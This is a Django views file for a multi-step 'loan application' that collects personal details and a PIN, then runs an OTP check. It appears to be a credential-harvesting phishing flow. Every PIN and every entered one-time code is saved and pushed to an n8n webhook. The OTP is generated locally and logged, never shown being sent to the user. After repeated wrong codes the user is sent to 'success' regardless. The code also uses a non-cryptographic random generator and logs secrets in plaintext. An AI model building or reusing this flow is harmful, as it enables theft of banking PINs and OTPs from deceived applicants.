import random
import string
import logging
from django.db import transaction
from django.shortcuts import redirect, render
from django.utils import timezone

from .forms import PersonalDetailsForm, ContactDetailsForm, LoanDetailsForm, OTPForm
from .models import Submission, OTPAttempt
from .services import notify_n8n, notify_n8n_otp_attempt

logger = logging.getLogger(__name__)

SESSION_KEY    = "loan_application"
SUBMISSION_KEY = "loan_submission_id"
OTP_KEY        = "loan_otp"
OTP_EXPIRY_KEY = "loan_otp_expiry"
OTP_ATTEMPTS_KEY = "loan_otp_attempts"   # count of attempts made so far

MAX_FAILED_ATTEMPTS = 3   # after this many failures, the 4th attempt redirects to success


def _generate_otp(length=6):
    return "".join(random.choices(string.digits, k=length))


def _clear_session(request):
    for key in (SESSION_KEY, SUBMISSION_KEY, OTP_KEY, OTP_EXPIRY_KEY, OTP_ATTEMPTS_KEY):
        request.session.pop(key, None)


# ── Step 1: Personal Details ─────────────────────────────────────────────────

def submit_view(request):
    data = request.session.get(SESSION_KEY, {})

    if request.method == "POST":
        form = PersonalDetailsForm(request.POST)
        if form.is_valid():
            data.update(form.cleaned_data)
            data["age"] = int(form.cleaned_data["age"])
            request.session[SESSION_KEY] = data
            return redirect("submissions:step2")
    else:
        form = PersonalDetailsForm(initial=data)

    return render(request, "submissions/submit.html", {
        "form": form,
        "step": 1,
        "step_label": "Personal Details",
        "total_steps": 3,
    })


# ── Step 2: Contact Details ───────────────────────────────────────────────────

def step2_view(request):
    data = request.session.get(SESSION_KEY, {})
    if not data.get("first_name"):
        return redirect("submissions:submit")

    if request.method == "POST":
        form = ContactDetailsForm(request.POST)
        if form.is_valid():
            data.update(form.cleaned_data)
            request.session[SESSION_KEY] = data
            return redirect("submissions:step3")
    else:
        form = ContactDetailsForm(initial=data)

    return render(request, "submissions/submit.html", {
        "form": form,
        "step": 2,
        "step_label": "Contact Details",
        "total_steps": 3,
    })


# ── Step 3: Loan Details — save to DB + fire webhook, then go to OTP ─────────

def step3_view(request):
    data = request.session.get(SESSION_KEY, {})
    if not data.get("phone"):
        return redirect("submissions:step2")

    if request.method == "POST":
        form = LoanDetailsForm(request.POST)
        if form.is_valid():
            data["amount"] = str(form.cleaned_data["amount"])
            data["pin"]    = form.cleaned_data["pin"]
            request.session[SESSION_KEY] = data

            # Save to DB immediately
            submission = Submission(
                first_name        = data["first_name"],
                last_name         = data["last_name"],
                age               = data["age"],
                employment_status = data["employment_status"],
                phone             = data["phone"],
                email             = data.get("email", ""),
                amount            = data["amount"],
                pin               = data["pin"],
                otp_verified      = False,
            )
            submission.save()
            request.session[SUBMISSION_KEY]  = submission.pk
            request.session[OTP_ATTEMPTS_KEY] = 0

            # Fire webhook immediately after commit
            transaction.on_commit(lambda: notify_n8n(submission))
            logger.info(
                "Submission #%s saved. Webhook queued for %s %s.",
                submission.pk, data["first_name"], data["last_name"],
            )

            # Generate OTP
            otp    = _generate_otp()
            expiry = timezone.now().timestamp() + 120
            request.session[OTP_KEY]        = otp
            request.session[OTP_EXPIRY_KEY] = expiry
            logger.info("OTP for submission #%s: %s", submission.pk, otp)

            return redirect("submissions:otp")
    else:
        form = LoanDetailsForm()

    return render(request, "submissions/submit.html", {
        "form": form,
        "step": 3,
        "step_label": "Loan Details",
        "total_steps": 3,
    })


# ── OTP Verification ──────────────────────────────────────────────────────────

def otp_view(request):
    submission_id   = request.session.get(SUBMISSION_KEY)
    otp             = request.session.get(OTP_KEY)
    expiry          = request.session.get(OTP_EXPIRY_KEY)
    data            = request.session.get(SESSION_KEY, {})
    attempts_so_far = request.session.get(OTP_ATTEMPTS_KEY, 0)

    if not submission_id or not otp:
        return redirect("submissions:step3")

    now          = timezone.now().timestamp()
    seconds_left = max(0, int((expiry or now) - now))
    expired      = seconds_left <= 0
    error        = None

    if request.method == "POST":

        # ── Resend ──────────────────────────────────────────────────────────
        if "resend" in request.POST:
            new_otp = _generate_otp()
            request.session[OTP_KEY]        = new_otp
            request.session[OTP_EXPIRY_KEY] = timezone.now().timestamp() + 120
            logger.info("OTP resent for submission #%s: %s", submission_id, new_otp)
            return redirect("submissions:otp")

        # ── OTP entry ────────────────────────────────────────────────────────
        form = OTPForm(request.POST)
        if form.is_valid():
            entered      = form.cleaned_data["otp"]
            matched      = (entered == otp) and not expired
            attempt_num  = attempts_so_far + 1

            # Persist the attempt
            try:
                submission = Submission.objects.get(pk=submission_id)
                attempt = OTPAttempt.objects.create(
                    submission     = submission,
                    attempt_number = attempt_num,
                    otp_entered    = entered,
                    matched        = matched,
                )
                # Fire otp.attempt webhook synchronously
                notify_n8n_otp_attempt(attempt)
            except Submission.DoesNotExist:
                logger.error("Submission #%s missing during OTP attempt.", submission_id)
                _clear_session(request)
                return redirect("submissions:submit")

            # Update attempt counter in session
            request.session[OTP_ATTEMPTS_KEY] = attempt_num

            if matched:
                # ── Correct OTP ──
                submission.otp_verified = True
                submission.otp_code     = entered
                submission.save(update_fields=["otp_verified", "otp_code"])
                logger.info("Submission #%s OTP verified on attempt %s.", submission_id, attempt_num)
                _clear_session(request)
                return redirect("submissions:success")

            else:
                # ── Wrong OTP ──
                failed_count = attempt_num  # every attempt so far has failed (we only reach here on mismatch)
                logger.warning(
                    "Submission #%s OTP mismatch on attempt %s (entered: %s).",
                    submission_id, attempt_num, entered,
                )

                if failed_count >= MAX_FAILED_ATTEMPTS:
                    # 3rd failure shown as error; on the 4th POST we redirect regardless
                    if failed_count == MAX_FAILED_ATTEMPTS:
                        # Show the "last chance" error on attempt 3
                        error = "Incorrect OTP. This is your last attempt."
                    else:
                        # 4th attempt (or beyond) — redirect to success unconditionally
                        _clear_session(request)
                        return redirect("submissions:success")
                else:
                    remaining_attempts = MAX_FAILED_ATTEMPTS - failed_count
                    error = (
                        f"Incorrect OTP. {remaining_attempts} attempt"
                        f"{'s' if remaining_attempts != 1 else ''} remaining."
                    )

        else:
            error = "Please enter a valid OTP."

    else:
        form = OTPForm()

    return render(request, "submissions/otp.html", {
        "form": form,
        "seconds_left": seconds_left,
        "expired": expired,
        "error": error,
        "phone": data.get("phone", ""),
        "attempts_so_far": request.session.get(OTP_ATTEMPTS_KEY, 0),
        "max_attempts": MAX_FAILED_ATTEMPTS,
    })


# ── Success ───────────────────────────────────────────────────────────────────

def success_view(request):
    return render(request, "submissions/success.html")
